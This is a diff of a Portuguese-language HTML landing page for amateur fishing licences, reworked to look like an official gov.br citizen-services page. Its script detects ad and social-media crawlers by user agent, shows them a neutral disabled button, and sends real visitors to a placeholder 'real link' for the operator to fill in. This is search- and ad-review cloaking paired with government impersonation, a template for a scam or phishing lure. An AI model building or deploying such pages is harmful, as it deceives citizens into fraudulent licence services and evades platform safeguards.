@@ -3,64 +3,115 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>🚨 Não Perca Sua Licença de Pesca! 🚨</title>
+  <title>Solicitar Licença de Pescador</title>
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #00796b, #004d40);
-      color: #f1f8f7;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+
+    header {
+      background-color: #002855;
+      color: #fff;
+      padding: 1rem;
       text-align: center;
-      padding: 3rem 1rem;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 1.5rem;
+    }
+
+    .container {
       max-width: 600px;
-      margin: auto;
+      margin: 2rem auto;
+      padding: 2rem;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
     }
-    h1 {
-      font-size: 2.4rem;
-      margin-bottom: 1rem;
-      text-shadow: 2px 2px 6px rgba(0,0,0,0.5);
+
+    .title {
+      font-size: 1.4rem;
+      font-weight: bold;
+      margin-bottom: 1.5rem;
+      text-align: center;
+      color: #002855;
     }
-    p {
-      font-size: 1.2rem;
-      margin-bottom: 2rem;
-      line-height: 1.5;
-      text-shadow: 1px 1px 4px rgba(0,0,0,0.4);
-    }
-    button {
-      background-color: #004085; /* Azul GOV */
+
+    .btn {
+      display: inline-block;
+      background-color: #004085;
       color: white;
       border: none;
-      padding: 1rem 3rem;
-      font-size: 1.3rem;
-      border-radius: 50px;
+      padding: 1rem 2.5rem;
+      font-size: 1.2rem;
+      border-radius: 30px;
       cursor: pointer;
-      box-shadow: 0 4px 12px rgba(0, 64, 133, 0.6);
-      transition: background-color 0.3s ease;
-      font-weight: 700;
+      font-weight: 600;
+      transition: background 0.3s ease;
+      margin-top: 1.2rem;
     }
-    button:hover {
-      background-color: #002752; /* Azul GOV mais escuro no hover */
-      box-shadow: 0 6px 18px rgba(0, 40, 90, 0.8);
+
+    .btn:hover {
+      background-color: #002752;
     }
-    .highlight {
-      color: #ffcc00;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 1.2px;
+
+    .section {
+      margin-top: 2rem;
+    }
+
+    .section h2 {
+      font-size: 1.2rem;
+      color: #004085;
+      margin-bottom: 0.5rem;
+    }
+
+    .section p {
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 0.8rem;
+      color: #666;
+      margin-top: 2rem;
     }
   </style>
 </head>
 <body>
-  <h1>🚨 <span class="highlight">Atenção</span> Pescadores! 🚨</h1>
-  <p>
-    Você sabia que <strong>pescar sem licença é crime e pode gerar multas altas</strong>?  
-    Não corra riscos desnecessários.  
-    Garanta já a sua <strong>Licença de Pesca Oficial</strong> e fique tranquilo para aproveitar a natureza!
-  </p>
-  <p>
-    Nosso guia rápido e fácil vai te mostrar o passo a passo para obter sua licença,  
-    sem burocracia e sem sair de casa.
-  </p>
-  <button id="btnSolicitar">Quero Minha Licença Agora!</button>
+  <header>
+    <h1>gov.br • Serviços ao Cidadão</h1>
+  </header>
+
+  <div class="container">
+    <div class="title">Solicitar Licença de Pescador Amador ou Esportivo</div>
+    <button id="btnSolicitar" class="btn">Iniciar Solicitação</button>
+
+    <div class="section">
+      <h2>📌 O que é?</h2>
+      <p>
+        A pesca amadora ou esportiva é uma atividade de natureza não comercial. Isso significa que o pescado
+        obtido não pode ser vendido, mas pode ser utilizado para consumo próprio, ornamentação ou pesca esportiva (pesque e solte).
+      </p>
+    </div>
+
+    <div class="section">
+      <h2>📋 Validade e requisitos</h2>
+      <p>
+        A licença tem validade de <strong>1 ano</strong> em todo o território nacional e deve ser emitida
+        diretamente pelo órgão responsável (SAP/MAPA).
+      </p>
+    </div>
+  </div>
+
+  <footer>
+    Esta é uma página informativa para facilitar o acesso ao processo de solicitação de licença.
+  </footer>
 
   <script>
     const bots = ['Googlebot', 'AdsBot-Google', 'Bingbot', 'facebookexternalhit', 'Twitterbot'];
@@ -69,14 +120,13 @@
 
     if (!isBot) {
       document.getElementById('btnSolicitar').addEventListener('click', () => {
-        window.location.href = "https://sualandingreal.com"; // <== Troque para sua URL real aqui
+        window.location.href = "https://sualandingreal.com"; // <== Troque aqui pelo seu link real
       });
     } else {
       const btn = document.getElementById('btnSolicitar');
-      btn.style.backgroundColor = '#555';
+      btn.style.backgroundColor = '#888';
       btn.style.cursor = 'default';
       btn.textContent = 'Conteúdo neutro para bots';
-      btn.removeEventListener('click', () => {});
     }
   </script>
 </body>
